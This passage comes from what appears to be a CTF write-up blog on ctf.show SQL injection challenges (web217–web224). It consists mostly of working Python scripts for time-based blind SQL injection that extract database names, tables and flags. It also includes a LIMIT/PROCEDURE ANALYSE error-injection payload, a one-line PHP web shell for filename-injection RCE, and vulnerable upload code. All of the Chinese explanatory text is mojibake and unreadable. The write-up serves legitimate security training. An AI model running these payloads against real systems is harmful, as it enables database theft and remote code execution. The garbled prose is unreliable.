punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h4><p><code>benchmark</code>è¢«banäº†</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³• ä½¿ç”¨æŸ¥è¯¢è¯­å¥ æŸ¥è¯¢å¤§é‡æ•°æ®ä»è€Œæ¶ˆè€—æ—¶é—´</p><p>æœ¬åœ°å…ˆæ¼”ç¤ºä¸€æ¬¡ usersä¸€å…±å…­æ¡æ•°æ® æœ€ç»ˆä¼šæœ‰36æ¡æ•°æ® 6*6&#x3D;36 formå å¦‚æœæ˜¯é€—å· ä¼šè¿›è¡Œæ’åˆ—ç»„åˆ å¦‚æœè¡¨è¶³å¤Ÿå¤§é‚£ä¹ˆæŸ¥è¯¢çš„æ•°æ®ä¹Ÿå°±ç›¸</p><p>å½“å¤§ï¼ˆåŸç†ä¸ç”¨ç†è§£ è®°ä½è¿™ä¹ˆç”¨èƒ½æŸ¥è¯¢å¤§é‡æ•°æ®å³å¯ï¼‰è¯¥æ–¹å¼å«ç¬›å¡å°”ç§¯</p><p><img src="web218.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://2ba8df77-69bf-43d4-99e0-b2689ef71af6.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">7</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment"># ctfshow&#123;f470e6gb-3856-42D3-ae55-402e84412f0P&#125;</span><span class="token comment"># ctfshow&#123;f47hc6hb-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c7dh-3856-4293-ae55-402e84412f04&#125;</span><span class="token comment"># ctfshow&#123;f470c6db-3856-4293-ae55-402e84412f04&#125; âˆš</span></code></pre><h4 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h4><p>å¤šå±è”½äº†ä¸€ä¸ªrlikeï¼ˆä¹Ÿæ˜¯å»¶æ—¶çš„ä¸€ç§æ–¹æ³•ï¼‰ ä¸Šä¸€é¢˜è„šæœ¬ä¾æ—§å¯ä»¥</p><h4 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h4><p>è¿‡æ»¤äº†substr é‚£å°±ä½¿ç”¨leftå³å¯ å¹¶ä¸”è¿‡æ»¤äº†concat å¯¼è‡´æˆ‘ä»¬group_concat ä¸ èƒ½ä½¿ç”¨ ä½†æ˜¯å¯ä»¥æ˜¯ç”¨limit é€è¡Œè·å–</p><p><strong>limit N,M</strong> : ç›¸å½“äº <strong>limit M offset N</strong> , ä»ç¬¬ N æ¡è®°å½•å¼€å§‹, è¿”å› M æ¡è®°å½•</p><p>å¦å¤–asciiä¹Ÿè¢«banäº†ï¼Œæ‰€ä»¥ç›´æ¥æ¯”è¾ƒå­—ç¬¦ä¸²</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://83d3e450-cfe1-4e34-9769-2021e662fa03.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagdic <span class="token operator">=</span> <span class="token string">"1234567890-_&#123;&#125;qwertyuioplkjhgfdsazxcvbnm, "</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagdic<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxcac,ctfshow_info</span>        <span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaabcc,info</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">',(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web221-limitæ³¨å…¥"><a href="#web221-limitæ³¨å…¥" class="headerlink" title="web221(limitæ³¨å…¥)"></a>web221(limitæ³¨å…¥)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤</span><span class="token comment">//æ‹¿åˆ°æ•°æ®åº“åå­—å°±ç®—ä½ èµ¢</span>      </code></pre><p>1ï¼‰<strong>limitå‰é¢æ²¡æœ‰order byæ—¶ï¼Œåé¢å¯ä»¥è·Ÿunionï¼Œå¦‚æœå­˜åœ¨order byï¼Œåˆ™ä¸èƒ½ä½¿ç”¨unionã€‚</strong></p><p>2ï¼‰limitåé¢ä¸èƒ½ç›´æ¥è·Ÿselectè¯­å¥å’Œifè¯­å¥ã€‚<strong>å¯ä»¥è·Ÿprocedureè¯­å¥ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯åªæœ‰åœ¨5.0.0&lt; MySQL &lt;5.6.6ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨ï¼Œprocedureåé¢æ”¯æŒæŠ¥é”™æ³¨å…¥ä»¥åŠæ—¶é—´ç›²æ³¨</strong></p><p>3ï¼‰limit å…³é”®å­—åé¢è¿˜å¯è·ŸPROCEDUREå’Œ INTOä¸¤ä¸ªå…³é”®å­—ï¼Œä½†æ˜¯ INTO åé¢å†™å…¥æ–‡ä»¶éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„ä»¥åŠå†™å…¥shellçš„æƒé™ï¼Œå› æ­¤åˆ©ç”¨æ¯”è¾ƒéš¾ã€‚</p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">PROCEDURE ANALYZE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code></pre><p><img src="web221.png" loading="lazy"></p><h4 id="web222-groupæ³¨å…¥"><a href="#web222-groupæ³¨å…¥" class="headerlink" title="web222(groupæ³¨å…¥)"></a>web222(groupæ³¨å…¥)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    </code></pre><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163">group byæ³¨å…¥åŸç†</a></p><p>å»¶æ—¶ç›²æ³¨ï¼Œä¾‹å¦‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">group by if(1&#x3D;1,sleep(1),1)</code></pre><blockquote><p>ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œgroup byä¼šå‘ä¸‹ä¸€ç›´æŸ¥è¯¢ï¼Œæ•°æ®åº“é‡Œæ€»å…±æœ‰21æ¡æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯sleep(0.05)åˆ™æ˜¯åœé¡¿1.05ç§’</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://cfb15639-dd8d-4146-a2c1-5b6e2e349162.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flaga,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat((if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(0.05), 2)),1);"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h4><p>group by ä½ç½®æ³¨å…¥ï¼Œå’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œä¸è¿‡è¿™æ¬¡å†å°è¯•ä¼šå‘ç°ç¦ç”¨äº†æ•°å­—ï¼Œæ”¹ç”¨ true æ„é€ æ•°å­—ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"https://9fb07532-bf0d-4e1c-b4aa-241e19c88933.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagas,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagasabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, username, 'a'))"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web224-æ–‡ä»¶åæ³¨å…¥"><a href="#web224-æ–‡ä»¶åæ³¨å…¥" class="headerlink" title="web224(æ–‡ä»¶åæ³¨å…¥)"></a>web224(æ–‡ä»¶åæ³¨å…¥)</h4><p>æŸ¥çœ‹&#x2F;robots.txtï¼Œå‘ç°&#x2F;pwdreset.phpï¼Œè¿›å»åå¯ä»¥é‡ç½®adminå¯†ç ï¼Œç„¶åæ˜¯è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶éƒ½æ˜¯ç±»å‹é”™è¯¯</p><p>æ–‡ä»¶åæ³¨å…¥ï¼Œä¸‹è½½ç¾¤é‡Œçš„<code>payload.bin</code>ï¼Œåå…­è¿›åˆ¶çš„æ„æ€æ˜¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_GET[1]?`</span><span class="token operator">></span></span></code></pre><p>ç„¶åè¿›è¡ŒRceå°±è¡Œ</p><p><img src="web224.png" loading="lazy"></p><p><strong>upload.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ–‡ä»¶è¿‡å¤§: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 